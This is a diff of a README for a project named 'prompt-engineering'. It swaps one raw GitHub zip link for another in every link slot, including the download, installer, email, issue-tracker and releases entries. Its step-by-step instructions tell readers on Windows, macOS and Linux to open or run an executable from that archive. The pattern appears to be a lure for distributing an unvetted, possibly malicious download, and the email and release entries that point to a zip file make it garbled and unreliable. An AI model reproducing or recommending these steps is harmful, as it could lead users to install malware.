@@ -8,27 +8,27 @@ To begin using the software, you will need to download it from the Releases page
 
 ## 📦 Download & Install
 ### Step 1: Visit the Releases Page
-To download the application, visit our GitHub Releases page here: [Download Here](https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip).
+To download the application, visit our GitHub Releases page here: [Download Here](https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/书/2. 核心技法篇——精准操作的四大支柱​​/prompt-engineering-atman.zip).
 
 ### Step 2: Download the Latest Version
 On the Releases page, you will see the latest version listed. Click on the appropriate download link for your operating system. Depending on your system, you may find files such as:
-- **Windows:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip
-- **macOS:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip
-- **Linux:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip
+- **Windows:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/书/2. 核心技法篇——精准操作的四大支柱​​/prompt-engineering-atman.zip
+- **macOS:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/书/2. 核心技法篇——精准操作的四大支柱​​/prompt-engineering-atman.zip
+- **Linux:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/书/2. 核心技法篇——精准操作的四大支柱​​/prompt-engineering-atman.zip
 
 ### Step 3: Install the Application
 After the download completes, locate the downloaded file. 
 
 - **For Windows:**
-  1. Double-click the `https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip` file.
+  1. Double-click the `https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/书/2. 核心技法篇——精准操作的四大支柱​​/prompt-engineering-atman.zip` file.
   2. Follow the on-screen instructions to complete the installation.
 
 - **For macOS:**
-  1. Open the `https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip` file.
+  1. Open the `https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/书/2. 核心技法篇——精准操作的四大支柱​​/prompt-engineering-atman.zip` file.
   2. Drag and drop the application into your Applications folder.
 
 - **For Linux:**
-  1. Extract the `https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip` file.
+  1. Extract the `https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/书/2. 核心技法篇——精准操作的四大支柱​​/prompt-engineering-atman.zip` file.
   2. Open a terminal in the extracted folder and run: `./prompt-engineering`.
 
 ## ⚙️ System Requirements
@@ -60,10 +60,10 @@ We welcome contributions from everyone. If you would like to help improve the pr
 ## 📧 Support
 If you encounter any issues or have questions, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip
-- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip)
+- **Email:** https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/书/2. 核心技法篇——精准操作的四大支柱​​/prompt-engineering-atman.zip
+- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/书/2. 核心技法篇——精准操作的四大支柱​​/prompt-engineering-atman.zip)
 
 ## 🌍 Acknowledgments
 Thank you for choosing **prompt-engineering**. We appreciate your support and hope you enjoy using our application. 
 
-For updates and new releases, always check back on our [Releases page](https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/Noachical/prompt-engineering.zip).
+For updates and new releases, always check back on our [Releases page](https://raw.githubusercontent.com/TheEspresso/prompt-engineering/MAIN/书/2. 核心技法篇——精准操作的四大支柱​​/prompt-engineering-atman.zip).
